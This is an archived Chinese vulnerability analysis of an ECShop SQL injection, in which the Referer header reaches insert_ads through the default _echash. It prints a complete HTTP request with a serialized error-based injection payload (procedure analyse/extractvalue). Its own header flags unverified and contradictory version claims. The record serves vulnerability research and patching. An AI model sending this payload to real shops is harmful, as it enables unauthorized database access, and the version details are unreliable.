---
source: "hatch 补库批 20260928"
product: "ECShop"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "ECShop <= 2.7.x sql注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：Title<=2.7.x vs body2.x/3.0.x/3.6.x; login page; template static hash; legacy MySQL procedure analyse/extractvalue"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-208d2c3c41e16050046ec969"
entity_id: "ve-208d2c3c41e16050046ec969"
schema_version: "1"
---

## 核对与使用边界

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Title&lt;=2.7.x vs body2.x/3.0.x/3.6.x; login page; template static hash; legacy MySQL procedure analyse/extractvalue

- **事实待核（1）**：Affected-version contradiction and only2.x hash PoC。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（2）**：Serialized num length72 appears inconsistent with displayed shorter SQL; verify byte count。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（3）**：Key source only screenshots; original Tencent syndicated link supplied。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ECShop \<= 2.7.x sql注入漏洞

一、漏洞简介
------------

二、漏洞影响
------------

ECShop（2.x、3.0.x、3.6.x）

三、复现过程
------------

### 漏洞分析

先看user.php

![](./.resource/ECShop=2.7.xsql注入漏洞/media/rId25.png)

\$back\_act变量来源于HTTP\_REFERER，我们可控。

assign函数用于在模版变量里赋值

![](./.resource/ECShop=2.7.xsql注入漏洞/media/rId26.png)

再看display函数

![](./.resource/ECShop=2.7.xsql注入漏洞/media/rId27.png)

读取user\_passport.dwt模版文件内容，显示解析变量后的html内容，用\_echash做分割，得到\$k然后交给isnert\_mod处理，由于\_echash是默认的，不是随机生成的，所以\$val内容可随意控制。

再看insert\_mod函数

![](./.resource/ECShop=2.7.xsql注入漏洞/media/rId28.png)

非常关键的一个地方，这里进行了动态调用

\$val传入进来用\|分割，参数传入进来时需要被序列化

再看include/lib\_insert.php中的insert\_ads函数

![](./.resource/ECShop=2.7.xsql注入漏洞/media/rId29.png)

可以看到这里直接就能注入了

### payload

    GET /user.php?act=login HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Cookie: PHPSESSID=9od********************2d0; ECS_ID=125**********************************559; ECS[visit_times]=1
    Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";i:1;}
    Connection: close
    Upgrade-Insecure-Requests: 1
    Cache-Control: max-age=0

![](./.resource/ECShop=2.7.xsql注入漏洞/media/rId31.png)

参考链接
--------

> https://cloud.tencent.com/developer/article/1333449
